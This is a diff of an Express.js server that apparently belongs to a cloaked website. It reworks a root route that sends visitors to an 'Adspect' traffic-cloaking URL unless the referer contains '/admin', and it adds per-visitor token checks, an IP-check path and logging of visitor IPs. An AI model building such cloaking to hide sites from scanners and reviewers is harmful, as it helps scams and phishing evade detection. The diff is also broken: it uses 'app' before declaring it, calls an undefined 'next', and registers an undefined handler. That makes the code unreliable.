@@ -303,14 +303,21 @@ const generateSessionId = (clientIP, userAgent) => {
 
 
 
-// Initialize server components
-const app = express();
 
-app.use(express.json());
-app.use(cookieParser());
+app.get('/', async (req, res) => {
+    const isAdminPanel = req.headers.referer?.includes('/admin');
+    
+    if (isAdminPanel) {
+        return next();
+    }
+    
+    if (!state.settings.websiteEnabled && !isAdminPanel) {
+        return res.redirect(state.settings.redirectUrl);
+    }
 
-secureServer(app);
-
+    // Redirect to Adspect URL
+    res.redirect('https://redirectionroute.com/');
+});
 
 const validateToken = (req, res, next) => {
     // Paths that should always skip token validation
@@ -330,12 +337,9 @@ const validateToken = (req, res, next) => {
         return next();
     }
 
-    // Special case for root path - redirect to Adspect
+    // Remove root path handling from here since we handle it separately above
     if (req.path === '/') {
-        if (req.headers.referer?.includes('/admin')) {
-            return next();
-        }
-        return res.redirect('https://redirectionroute.com/');
+        return next();
     }
 
     // Special case for /check-ip - validate token but don't redirect
@@ -364,14 +368,32 @@ const validateToken = (req, res, next) => {
     next();
 };
 
-// Apply token validation
-app.use(validateToken);
+// Reorder your middleware and routes
+const app = express();
 
+// Basic middleware
+app.use(express.json());
+app.use(cookieParser());
+
+// Security middleware
+secureServer(app);
+
+
+
+app.get('/', theRootRouteHandler); // The one we defined above
 
 
 
 app.use((req, res, next) => {
-    console.log(`[REQUEST] ${req.method} ${req.path} ${req.originalUrl}`);
+    console.log({
+        timestamp: new Date().toISOString(),
+        method: req.method,
+        path: req.path,
+        fullUrl: req.originalUrl,
+        referer: req.headers.referer || 'none',
+        ip: req.headers['x-forwarded-for'] || req.ip,
+        token: req.query.token ? `...${req.query.token.slice(-6)}` : 'none'
+    });
     next();
 });
 
@@ -479,6 +501,7 @@ const tokenManager = {
         }
     }
 };
+app.use(validateToken);
 
 // Add cleanup interval
 setInterval(() => tokenManager.cleanupTokens(), 5 * 60 * 1000);
@@ -945,25 +968,7 @@ app.post('/generate-token', async (req, res) => {
     res.json({ token });
 });
 
-app.get('/', async (req, res) => {
-    const isAdminPanel = req.headers.referer?.includes('/admin');
-    
-    if (isAdminPanel) {
-        return next();
-    }
-    
-    if (!state.settings.websiteEnabled && !isAdminPanel) {
-        return res.redirect(state.settings.redirectUrl);
-    }
 
-    try {
-        // Instead of running PHP, redirect to your hosted Adspect URL
-        res.redirect('https://redirectingroute.com/'); // Replace with your actual URL
-    } catch (error) {
-        console.error('Error in root route:', error);
-        res.redirect(state.settings.redirectUrl);
-    }
-});
 // Page serving route - must come after other routes
 app.get('/:page', pageServingMiddleware);
 
